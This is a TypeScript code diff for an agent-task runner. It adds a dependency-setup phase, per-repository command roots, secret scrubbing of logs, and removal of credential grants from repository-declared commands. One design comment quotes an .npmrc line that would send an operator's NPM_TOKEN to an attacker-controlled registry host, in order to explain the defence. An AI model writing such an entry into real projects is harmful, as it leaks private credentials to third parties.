@@ -22,20 +22,28 @@ import type {
 } from '@ever-works/contracts';
 import type { WorkspacePublishFence } from '@ever-works/plugin';
 import {
+	FLEET_AGENT_TASK_MAX_SETUP_STEPS,
 	FLEET_AGENT_TASK_MAX_STEPS,
+	FLEET_AGENT_TASK_SETUP_DEFAULT_TIMEOUT_SEC,
+	FLEET_AGENT_TASK_SETUP_LOG_TAIL_BYTES,
+	FLEET_AGENT_TASK_SETUP_MAX_TIMEOUT_SEC,
 	FLEET_RUN_SECRETS_UNAVAILABLE_REASON,
 	FLEET_RUN_SECRETS_UNRESOLVED_REASON,
 	FleetAgentExecutionError,
-	normalizeFleetAgentModelExecution
+	normalizeFleetAgentModelExecution,
+	REPO_DECLARED_COMMAND_ID_PREFIX
 } from '@ever-works/contracts';
 import { FleetClientError } from '../fleet-client';
 import {
+	fitNodeOutcomeToResultBudget,
 	normalizeChecks,
 	runNodeCommandStep,
 	type AcceptanceChecksIo,
 	type NodeCheckResult,
+	type NodeCommandLimits,
 	type WireCheck
 } from './acceptance-checks';
+import { resolveCommandRoot, type CommandRootFs } from './command-roots';
 import {
 	collectOwnerQuestion,
 	defaultQuestionFs,
@@ -340,6 +348,12 @@ export interface AgentTaskIo extends AcceptanceChecksIo {
 	 * worktree (and in writable mounts). Defaults to `node:fs`.
 	 */
 	questionFs?: AgentTaskQuestionFs;
+	/**
+	 * EW-807: the `lstat` / `realpath` seam {@link resolveCommandRoot} uses
+	 * to PROVE a mount's path is a real, unlinked directory before a
+	 * command is spawned in it. Defaults to `node:fs`.
+	 */
+	commandRootFs?: CommandRootFs;
 	platform?: NodeJS.Platform;
 }
 
@@ -387,6 +401,11 @@ export async function runAgentTaskJob(
 	const runEnvGrants = Array.isArray(execution?.envGrants) ? execution.envGrants : [];
 	const checks = withRunEnvGrants(resolveAcceptanceChecks(payload), runEnvGrants);
 	const grantedSteps = withRunEnvGrants(steps, runEnvGrants);
+	// Setup phase (EW-807): the install gets the run's grants on the same
+	// footing as everything else — a private registry token is exactly what
+	// an install needs, and it is the one command in the run that cannot
+	// work without one.
+	const setup = withRunEnvGrants(normalizeAgentTaskSetup(payload.setup), runEnvGrants);
 
 	let workspaceResolution: { path: string; descriptor: FleetTaskWorkspaceDescriptor | null };
 	try {
@@ -418,6 +437,7 @@ export async function runAgentTaskJob(
 				runId,
 				execution,
 				steps: grantedSteps,
+				setup,
 				checks,
 				workspaceResolution,
 				runEnvGrants,
@@ -557,6 +577,8 @@ interface ResolvedAgentTask {
 	runId: string | null;
 	execution: FleetAgentModelExecution | null;
 	steps: WireCheck[];
+	/** Dispatch-frozen setup phase (EW-807); runs first, budgeted apart. */
+	setup: WireCheck[];
 	checks: WireCheck[];
 	workspaceResolution: { path: string; descriptor: FleetTaskWorkspaceDescriptor | null };
 	/** Env names this run was granted; their VALUES are scrubbed from every report. */
@@ -571,14 +593,49 @@ interface ResolvedAgentTask {
 }
 
 /**
- * Stamp the run's env grants onto each command, unioned with whatever the
- * command already declared. Case-insensitive, because Windows env names
- * are; the node re-derives what it will actually honour in
- * `buildNodeCheckEnv`, so this only decides what is OFFERED.
+ * Stamp the run's env grants onto each command. Case-insensitive, because
+ * Windows env names are; the node re-derives what it will actually honour
+ * in `buildNodeCheckEnv`, so this only decides what is OFFERED.
+ *
+ * EXCEPT for a command the REPOSITORY authored (EW-807).
+ *
+ * An env grant is an operator saying "let this repository's own commands
+ * read this credential" — a `NPM_TOKEN` for a private registry, a
+ * `DATABASE_URL` for a test suite. The author of those commands was, until
+ * `spec.tasks` was read, always a Work member with settings or Task-edit
+ * rights. A repository-declared command's author is anyone who can land a
+ * commit or a PR branch.
+ *
+ * And an allow-list over command STRINGS cannot bound where a granted
+ * value goes, because the allow-listed string delegates: a repository that
+ * commits an `.npmrc` containing `//attacker/:_authToken=${NPM_TOKEN}`
+ * has the operator's registry token posted to it by the exactly-matching,
+ * exactly-allow-listed `pnpm install --frozen-lockfile`. Nothing about
+ * that command is wrong; the file beside it is.
+ *
+ * So the grant follows AUTHORSHIP, not the phase. Owner-authored commands
+ * keep every grant they had; repository-declared ones — the ids the
+ * platform mints with {@link REPO_DECLARED_COMMAND_ID_PREFIX}, a prefix an
+ * owner-authored id cannot spell (`/` is outside
+ * `ACCEPTANCE_CHECK_ID_PATTERN`) — get none. An owner who wants their
+ * install to reach a private registry authors that install in the Work's
+ * own setup defaults, where they are the author of both halves.
+ *
+ * Re-derived on the node rather than trusted from the payload, the same
+ * way `buildNodeCheckEnv` re-derives the un-grantable core: this is the
+ * machine the credential actually lives on.
  */
 function withRunEnvGrants(checks: readonly WireCheck[], runEnvGrants: readonly string[]): WireCheck[] {
 	if (runEnvGrants.length === 0) return [...checks];
 	return checks.map((check) => {
+		if (isRepositoryAuthoredCommand(check)) {
+			// Not "merged with an empty list" — the key is REMOVED, so a
+			// future payload that put grants here could not reach the env
+			// builder through this path either.
+			const withoutGrants: WireCheck = { ...check };
+			delete withoutGrants.envGrants;
+			return withoutGrants;
+		}
 		const merged: string[] = [];
 		const seen = new Set<string>();
 		for (const name of [...(check.envGrants ?? []), ...runEnvGrants]) {
@@ -592,15 +649,34 @@ function withRunEnvGrants(checks: readonly WireCheck[], runEnvGrants: readonly s
 	});
 }
 
+/** A command the repository's own `.works/works.yml` declared (EW-807). */
+export function isRepositoryAuthoredCommand(command: Pick<WireCheck, 'id'>): boolean {
+	return typeof command.id === 'string' && command.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX);
+}
+
 /** The run proper, once the payload is validated and the workspace resolved. */
 async function runResolvedAgentTask(
 	context: ResolvedAgentTask,
 	io: AgentTaskIo,
 	signal?: AbortSignal
 ): Promise<AgentTaskOutcome> {
-	const { job, payload, taskId, runId, execution, steps, checks, workspaceResolution, runEnvGrants } = context;
+	const { job, payload, taskId, runId, execution, steps, setup, checks, workspaceResolution, runEnvGrants } = context;
 	const runSecretValues = context.runSecretValues;
 	throwIfAgentTaskAborted(signal);
+
+	// Every command's log tail is scrubbed of the values behind the names
+	// this run was granted, on the same footing as the model summary. A
+	// failing `pnpm test` prints its connection string, and that tail lands
+	// in the job result the platform stores.
+	// `runSecretValues` rides the same seam: the contents of the delivered
+	// `.env` files are in no environment to look up, and a failing suite
+	// prints the connection string it read from one.
+	//
+	// Resolved before ANY command runs (EW-807): the setup phase is the
+	// first thing to spawn and the most likely thing to print a registry
+	// token in a stack trace.
+	const reported = (result: NodeCheckResult): NodeCheckResult =>
+		redactCommandResult(result, runEnvGrants, io.parentEnv, runSecretValues);
 
 	const questionFs = io.questionFs ?? defaultQuestionFs;
 	const questionMounts = (workspaceResolution.descriptor?.mounts ?? []).map((mount) => ({
@@ -608,7 +684,33 @@ async function runResolvedAgentTask(
 		path: mount.path,
 		writable: mount.writable
 	}));
-	if (execution) {
+
+	const failures: string[] = [];
+
+	// ── SETUP PHASE (EW-807) ────────────────────────────────────────────
+	//
+	// FIRST, before the model: a node-provisioned worktree is a bare `git
+	// worktree` with no `node_modules`, and every command after this one —
+	// the model's own type-checks included — fails without it.
+	//
+	// Its own budget (`SETUP_COMMAND_LIMITS`), its own log tail, and its own
+	// reported block. A red setup is NOT a red gate: it means the machine
+	// was never made ready, so no verdict after it would have described the
+	// change. The node stops rather than spending a model call and a suite
+	// run producing failures that all say "cannot find module".
+	const setupResults = await runCommandPhase(setup, context, io, signal, SETUP_COMMAND_LIMITS, reported);
+	const setupStatus: 'green' | 'red' | 'none' =
+		setup.length === 0
+			? 'none'
+			: setup.some((step, index) => step.required !== false && setupResults[index].status !== 'green')
+				? 'red'
+				: 'green';
+	const setupBlocked = setupStatus === 'red';
+	if (setupBlocked) {
+		failures.push(describeSetupFailure(setup, setupResults));
+	}
+
+	if (execution && !setupBlocked) {
 		// The worktree is reused in place across runs (no clean, no
 		// re-clone): a question file left by an aborted attempt, or by the
 		// previous run whose question the owner already answered, must never
@@ -620,13 +722,15 @@ async function runResolvedAgentTask(
 		throwIfAgentTaskAborted(signal);
 	}
 
-	const failures: string[] = [];
 	let model: FleetAgentTaskModelResult | null = null;
 	// Slice Z: the bridge verdict rides alongside the model verdict — it is
 	// reported, never a failure. A run whose platform tools did not come up
 	// is a run without tools, not a broken run.
 	let mcp: FleetAgentTaskMcpResult | null = null;
-	if (execution) {
+	// EW-807: a blocked setup skips the model entirely. With no dependencies
+	// installed the model step would fail for a reason that has nothing to do
+	// with the change, which is the failure this slice exists to stop.
+	if (execution && !setupBlocked) {
 		const modelStep = await runModelStep(
 			job.id,
 			execution,
@@ -650,7 +754,7 @@ async function runResolvedAgentTask(
 	// NEVER pushes to `failures` — the platform decides what a paused run
 	// means, and the model / check / git verdicts below stay honest.
 	let question: FleetAgentTaskQuestion | null = null;
-	if (execution) {
+	if (execution && !setupBlocked) {
 		question = await collectOwnerQuestion(
 			{ primaryPath: workspaceResolution.path, mounts: questionMounts },
 			questionFs,
@@ -659,37 +763,20 @@ async function runResolvedAgentTask(
 		throwIfAgentTaskAborted(signal);
 	}
 
-	// Every command's log tail is scrubbed of the values behind the names
-	// this run was granted, on the same footing as the model summary. A
-	// failing `pnpm test` prints its connection string, and that tail lands
-	// in the job result the platform stores.
-	// `runSecretValues` rides the same seam: the contents of the delivered
-	// `.env` files are in no environment to look up, and a failing suite
-	// prints the connection string it read from one.
-	const reported = (result: NodeCheckResult): NodeCheckResult =>
-		redactCommandResult(result, runEnvGrants, io.parentEnv, runSecretValues);
-
-	const stepResults: NodeCheckResult[] = [];
-	for (const step of steps) {
-		throwIfAgentTaskAborted(signal);
-		stepResults.push(reported(await runNodeCommandStep(step, workspaceResolution.path, io, signal)));
-		throwIfAgentTaskAborted(signal);
-	}
-	const anyRequiredStepFailed = steps.some(
-		(step, index) => step.required !== false && stepResults[index].status !== 'green'
-	);
+	const stepResults = setupBlocked ? [] : await runCommandPhase(steps, context, io, signal, undefined, reported);
+	const anyRequiredStepFailed =
+		!setupBlocked && steps.some((step, index) => step.required !== false && stepResults[index].status !== 'green');
 	if (anyRequiredStepFailed) {
 		failures.push('a required command step did not pass');
 	}
 
-	const checkResults: NodeCheckResult[] = [];
-	for (const check of checks) {
-		throwIfAgentTaskAborted(signal);
-		checkResults.push(reported(await runNodeCommandStep(check, workspaceResolution.path, io, signal)));
-		throwIfAgentTaskAborted(signal);
-	}
+	const checkResults = setupBlocked ? [] : await runCommandPhase(checks, context, io, signal, undefined, reported);
+	// `none`, never `red`, when setup blocked: the gate did not fail, it
+	// never ran. Reporting a red gate for an install failure is exactly the
+	// lie this slice removes — it makes a fleet pull request's checks read
+	// as a judgement on the change when they are a judgement on the machine.
 	const gateStatus: 'green' | 'red' | 'none' =
-		checks.length === 0
+		setupBlocked || checks.length === 0
 			? 'none'
 			: checks.some((check, index) => check.required !== false && checkResults[index].status !== 'green')
 				? 'red'
@@ -719,8 +806,11 @@ async function runResolvedAgentTask(
 
 	let git: FleetAgentTaskGitResult | null = null;
 	let mountGit: FleetAgentTaskGitResult[] | null = null;
+	// `!setupBlocked` (EW-807): the model never ran, so there is nothing to
+	// commit — and a branch pushed for a run that did no work is a pull
+	// request a human has to open to discover it is empty.
 	const wantsCommit = payload.git?.commit !== false;
-	if (execution && workspaceResolution.descriptor && wantsCommit) {
+	if (execution && workspaceResolution.descriptor && wantsCommit && !setupBlocked) {
 		// Resolved ONCE, here, for every publish this run makes. Late, because
 		// the keep-alive advances the deadline on each renewal and a model step
 		// outlives several — fencing against the value the job was leased with
@@ -759,14 +849,27 @@ async function runResolvedAgentTask(
 	}
 	throwIfAgentTaskAborted(signal);
 
-	return {
+	// EW-807: the assembled outcome is measured the way `completeJob`
+	// measures it and trimmed — by shedding LOG TEXT — until it fits. The
+	// setup phase made this reachable on the GREEN path (8 steps x an 8 KiB
+	// tail of a package manager's output), and the platform's answer to an
+	// oversize result is to reject the settlement, which the worker loop
+	// re-reports as a FAILURE and `completeJob` then stores with no result
+	// at all: verdict, setup block, owner question and pushed branch, gone.
+	// A shorter install log is a far cheaper loss. See
+	// {@link fitNodeOutcomeToResultBudget}.
+	return fitNodeOutcomeToResultBudget({
 		status: failures.length === 0 ? 'succeeded' : 'failed',
 		taskId,
 		runId,
 		workspace: workspaceResolution.descriptor,
 		steps: stepResults,
+		// Conditional keys: a run that carried no setup phase reports exactly
+		// what it always did.
+		...(setupResults.length > 0 ? { setup: setupResults } : {}),
+		...(setup.length > 0 ? { setupStatus } : {}),
 		...(execution ? { model } : {}),
-		...(checks.length > 0 ? { checks: checkResults } : {}),
+		...(checkResults.length > 0 ? { checks: checkResults } : {}),
 		gateStatus,
 		...(git ? { git } : {}),
 		...(mountGit && mountGit.length > 0 ? { mountGit } : {}),
@@ -778,7 +881,7 @@ async function runResolvedAgentTask(
 		// ran and how many tool calls went through it.
 		...(mcp ? { mcp } : {}),
 		...(failures.length > 0 ? { failureReason: failures.join('; ') } : {})
-	};
+	});
 }
 
 function resolveExecution(payload: FleetAgentTaskPayload): FleetAgentModelExecution | null {
@@ -817,6 +920,113 @@ function resolveMcpBridgeSpec(payload: FleetAgentTaskPayload): FleetAgentTaskMcp
 		serverName: mcp.serverName.trim(),
 		...(Array.isArray(mcp.toolFamilies) ? { toolFamilies: mcp.toolFamilies } : {})
 	};
+}
+
+/**
+ * The setup phase's budget (EW-807). An install is slower and noisier
+ * than any test run, so it gets its own default, its own ceiling and its
+ * own log window — and it gets them by PARAMETER, through the one command
+ * runner, rather than by a second runner that would let the env scrub and
+ * the termination proof drift apart between phases.
+ */
+const SETUP_COMMAND_LIMITS: NodeCommandLimits = {
+	defaultTimeoutSec: FLEET_AGENT_TASK_SETUP_DEFAULT_TIMEOUT_SEC,
+	maxTimeoutSec: FLEET_AGENT_TASK_SETUP_MAX_TIMEOUT_SEC,
+	logTailBytes: FLEET_AGENT_TASK_SETUP_LOG_TAIL_BYTES
+};
+
+/**
+ * Run one ordered phase of commands, each in the repository IT names.
+ *
+ * The one place a command's root directory is decided. Before EW-807 every
+ * step and every check was handed `workspaceResolution.path` — the primary
+ * worktree — so a run that edited three repositories tested one of them.
+ *
+ * `mountDir` is resolved by LOOKUP against the descriptor this run's
+ * provisioner returned, never by joining a string onto a path; a name that
+ * is not a mount of this run REFUSES the job rather than quietly falling
+ * back to the primary, because "we could not find the repository you asked
+ * us to test, so we tested a different one" is not a verdict. See
+ * {@link resolveCommandRoot}.
+ */
+async function runCommandPhase(
+	commands: readonly WireCheck[],
+	context: ResolvedAgentTask,
+	io: AgentTaskIo,
+	signal: AbortSignal | undefined,
+	limits: NodeCommandLimits | undefined,
+	reported: (result: NodeCheckResult) => NodeCheckResult
+): Promise<NodeCheckResult[]> {
+	const results: NodeCheckResult[] = [];
+	for (const command of commands) {
+		throwIfAgentTaskAborted(signal);
+		const root = await resolveCommandRoot(
+			command.mountDir,
+			context.workspaceResolution.path,
+			context.workspaceResolution.descriptor?.mounts,
+			io.commandRootFs
+		);
+		results.push(reported(await runNodeCommandStep(command, root, io, signal, limits)));
+		throwIfAgentTaskAborted(signal);
+	}
+	return results;
+}
+
+/** Longest id fragment quoted into a failure reason, which lands on the job row. */
+const SETUP_FAILURE_ID_MAX_CHARS = 60;
+/** How many failing setup steps are named before the reason is elided. */
+const SETUP_FAILURE_MAX_NAMED = 3;
+
+/**
+ * Say SETUP FAILED, in those words, and say which step.
+ *
+ * The whole point of the phase is that this sentence never reads as "a
+ * test failed". It lands in `failureReason`, which is what the run report
+ * and the Task page show a human.
+ */
+function describeSetupFailure(setup: readonly WireCheck[], results: readonly NodeCheckResult[]): string {
+	const failed = setup
+		.map((step, index) => ({ step, result: results[index] }))
+		.filter(({ step, result }) => step.required !== false && result && result.status !== 'green')
+		.map(({ step, result }) => {
+			const id = step.id.slice(0, SETUP_FAILURE_ID_MAX_CHARS);
+			switch (result.status) {
+				case 'timeout':
+					return `'${id}' timed out`;
+				case 'error':
+					return `'${id}' could not be started`;
+				default:
+					return `'${id}' exited ${result.exitCode ?? 'without a code'}`;
+			}
+		});
+	const named = failed.slice(0, SETUP_FAILURE_MAX_NAMED).join('; ');
+	const rest =
+		failed.length > SETUP_FAILURE_MAX_NAMED ? ` (and ${failed.length - SETUP_FAILURE_MAX_NAMED} more)` : '';
+	return (
+		`SETUP FAILED: ${named}${rest}. The workspace was never prepared, so the model, the steps and the ` +
+		`acceptance checks did not run — this is not a failing test.`
+	);
+}
+
+/**
+ * Validate the wire setup phase. Same refusal posture as the steps and the
+ * checks: a malformed entry fails the job rather than being dropped,
+ * because a silently dropped install is a run whose every later verdict is
+ * about the missing dependencies.
+ */
+export function normalizeAgentTaskSetup(raw: unknown): WireCheck[] {
+	if (raw === undefined || raw === null) {
+		return [];
+	}
+	if (!Array.isArray(raw)) {
+		throw new AgentTaskPayloadError('Job payload `setup` must be an array');
+	}
+	if (raw.length > FLEET_AGENT_TASK_MAX_SETUP_STEPS) {
+		throw new AgentTaskPayloadError(
+			`Job carries ${raw.length} setup steps; the per-job ceiling is ${FLEET_AGENT_TASK_MAX_SETUP_STEPS}`
+		);
+	}
+	return normalizeWireCommands(raw, 'Setup step');
 }
 
 function resolveAcceptanceChecks(payload: FleetAgentTaskPayload): WireCheck[] {
@@ -1299,33 +1509,55 @@ export function normalizeAgentTaskSteps(raw: unknown): WireCheck[] {
 			`Job carries ${raw.length} steps; the per-job ceiling is ${FLEET_AGENT_TASK_MAX_STEPS}`
 		);
 	}
+	return normalizeWireCommands(raw, 'Step');
+}
+
+/**
+ * The per-entry validator `steps` and `setup` (EW-807) share, so the two
+ * phases cannot disagree about what a command even is. `label` is what a
+ * refusal calls the entry, so the message still names the field the
+ * operator has to fix.
+ */
+function normalizeWireCommands(raw: readonly unknown[], label: string): WireCheck[] {
 	return raw.map((entry, index) => {
 		if (!entry || typeof entry !== 'object') {
-			throw new AgentTaskPayloadError(`Step at index ${index} is not an object`);
+			throw new AgentTaskPayloadError(`${label} at index ${index} is not an object`);
 		}
 		const step = entry as Partial<FleetAgentTaskStep> & Record<string, unknown>;
 		const id = typeof step.id === 'string' ? step.id.trim() : '';
 		const command = typeof step.command === 'string' ? step.command.trim() : '';
 		if (!id) {
-			throw new AgentTaskPayloadError(`Step at index ${index} has no id`);
+			throw new AgentTaskPayloadError(`${label} at index ${index} has no id`);
 		}
 		if (!command) {
-			throw new AgentTaskPayloadError(`Step '${id}' has no command`);
+			throw new AgentTaskPayloadError(`${label} '${id}' has no command`);
 		}
 		const out: WireCheck = { id, command };
 		if (typeof step.cwd === 'string' && step.cwd.trim()) out.cwd = step.cwd.trim();
+		// EW-807: WHICH repository this command runs in. Copied through and
+		// resolved by `resolveCommandRoot` against the provisioned
+		// descriptor, which is the gate — see `runCommandPhase`.
+		if (typeof step.mountDir === 'string' && step.mountDir.trim()) out.mountDir = step.mountDir.trim();
 		if (typeof step.timeoutSec === 'number') out.timeoutSec = step.timeoutSec;
 		if (typeof step.required === 'boolean') out.required = step.required;
 		if (Array.isArray(step.envPassthrough)) {
 			out.envPassthrough = step.envPassthrough.filter((n): n is string => typeof n === 'string');
 		}
-		// Run secrets (slice Y): the per-repository grants ride the step the
-		// same way. Filtered, not validated, here — `buildNodeCheckEnv`
-		// re-derives what this machine will actually honour, and that is the
-		// gate that matters.
-		if (Array.isArray(step.envGrants)) {
-			out.envGrants = step.envGrants.filter((n): n is string => typeof n === 'string');
-		}
+		// `envGrants` is deliberately NOT read off the wire (EW-807).
+		//
+		// `normalizeChecks` never read it, so before this slice the two
+		// normalizers disagreed: a per-command grant an acceptance check
+		// refused was honoured for a step — and now, for the SETUP phase,
+		// which runs first, before the model, at a 5400s ceiling. That is
+		// the "two subtly-different runners" outcome `NodeCommandLimits`
+		// exists to prevent, pointing the wrong way.
+		//
+		// Reconciled toward the narrower side: on this node a command's
+		// grants come from ONE place, the run-level `execution.envGrants`
+		// that `withRunEnvGrants` stamps on, which is the single list the
+		// platform derives from the run's repo connections and the single
+		// list an operator can audit. Nothing on the platform emits a
+		// per-command grant today, so nothing loses a capability here.
 		return out;
 	});
 }
